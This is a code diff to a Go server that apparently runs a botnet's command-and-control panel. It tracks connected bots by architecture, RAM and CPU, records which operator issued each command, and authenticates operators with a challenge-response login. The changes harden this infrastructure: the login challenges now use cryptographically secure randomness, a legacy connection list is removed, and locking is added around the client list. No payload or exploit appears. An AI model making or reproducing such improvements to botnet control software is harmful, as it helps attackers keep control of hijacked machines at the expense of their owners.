@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"crypto/md5"
+	cryptoRand "crypto/rand"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
@@ -165,8 +166,15 @@ func generateAuthResponse(challenge, secret string) string {
 func randomChallenge(length int) string {
 	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	b := make([]byte, length)
+	if _, err := cryptoRand.Read(b); err != nil {
+		// Fallback to math/rand only if crypto/rand fails
+		for i := range b {
+			b[i] = charset[rand.Intn(len(charset))]
+		}
+		return string(b)
+	}
 	for i := range b {
-		b[i] = charset[rand.Intn(len(charset))]
+		b[i] = charset[b[i]%byte(len(charset))]
 	}
 	return string(b)
 }
@@ -270,7 +278,6 @@ func addBotConnection(conn net.Conn, botID string, arch string, ram int64, cpuCo
 	}
 
 	botConnections[botID] = botConn
-	botConns = append(botConns, conn)
 	botCount++
 
 	// Notify TUI of connection
@@ -304,13 +311,6 @@ func removeBotConnection(botID string) {
 		delete(commandOrigin, botID)
 		originLock.Unlock()
 
-		// Remove from legacy list for backwards compatibility
-		for i, conn := range botConns {
-			if conn == botConn.conn {
-				botConns = append(botConns[:i], botConns[i+1:]...)
-				break
-			}
-		}
 	}
 }
 
@@ -386,13 +386,6 @@ func handleBotConnection(conn net.Conn) {
 			}
 		}
 
-		// Remove from legacy list
-		for i, botConn := range botConns {
-			if botConn == conn {
-				botConns = append(botConns[:i], botConns[i+1:]...)
-				break
-			}
-		}
 		botConnsLock.Unlock()
 
 		conn.Close()
@@ -696,7 +689,9 @@ func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
 				conn: conn,
 				user: *user,
 			}
+			clientsLock.Lock()
 			clients = append(clients, loggedClient)
+			clientsLock.Unlock()
 			return true, loggedClient
 		}
 
